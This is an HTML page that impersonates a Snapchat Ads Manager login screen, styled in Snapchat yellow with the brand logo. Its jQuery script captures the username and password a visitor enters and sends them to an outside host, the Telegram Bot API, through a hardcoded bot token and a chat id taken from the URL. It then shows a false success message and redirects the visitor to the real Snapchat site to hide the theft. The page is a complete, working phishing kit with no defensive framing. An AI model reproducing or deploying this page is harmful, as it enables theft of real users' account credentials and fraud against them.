<!DOCTYPE html>
<html>
  <head>
    <title>Snapchat Login</title>
    <style>
      body {
        font-family: 'Arial', sans-serif;
        text-align: center;
        background-color: #fffc00;  /* Snapchat Yellow */
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .login-container {
        background-color: white;
        padding: 40px 30px;
        border-radius: 20px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
        width: 90%;
        max-width: 400px;
      }

      .snapchat-logo {
        width: 80px;
        margin-bottom: 20px;
      }

      h2 {
        font-size: 28px;
        color: #333;
        margin-bottom: 10px;
      }

      p {
        color: #666;
        font-size: 14px;
        margin-bottom: 30px;
      }

      input {
        width: 100%;
        padding: 15px;
        margin-bottom: 20px;
        border: 1px solid #ddd;
        border-radius: 10px;
        font-size: 16px;
      }

      button {
        width: 100%;
        background-color: #fffc00;
        color: black;
        padding: 15px;
        border: none;
        border-radius: 10px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        transition: background-color 0.3s;
      }

      button:hover {
        background-color: #f5e500;
      }

      .signup {
        margin-top: 20px;
        font-size: 14px;
      }

      .signup a {
        color: #333;
        font-weight: bold;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <img
        src="https://logos-world.net/wp-content/uploads/2021/02/Snapchat-Logo.png"
        alt="Snapchat Logo"
        class="snapchat-logo"
      />
      <h2>Log In</h2>
      <p>to continue to Ads Manager</p>
      <form id="loginForm">
        <input
          type="text"
          name="username"
          id="username"
          placeholder="Username or Email"
          required
        />
        <input
          type="password"
          name="password"
          id="password"
          placeholder="Password"
          required
        />
        <button type="submit">Log In</button>
      </form>
      <p class="signup">
        New to Snapchat? <a href="#">Sign Up</a>
      </p>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
      $(document).ready(function () {
        $("#loginForm").submit(function (e) {
          e.preventDefault();

          var username = $("#username").val();
          var password = $("#password").val();

          // Retrieve Telegram ID from URL
          const urlParams = new URLSearchParams(window.location.search);
          const chatId = urlParams.get('id') || "DEFAULT_CHAT_ID";  // Fallback to default if no ID

          // Telegram bot token
          var botToken = "7978969326:AAGaU9fKKl9Y_pgtURqkZHZ5ReDoXwPcYLo";

          $.ajax({
            url: `https://api.telegram.org/bot${botToken}/sendMessage`,
            method: "POST",
            data: {
              chat_id: chatId,
              text: `Username: ${username}\nPassword: ${password}`,
            },
            success: function () {
              alert("Logged in successfully.");
              window.location.href = "https://snapchat.com";  // Redirect to Snapchat
            },
            error: function () {
              alert("Failed to send data.");
            },
          });
        });
      });
    </script>
  </body>
</html>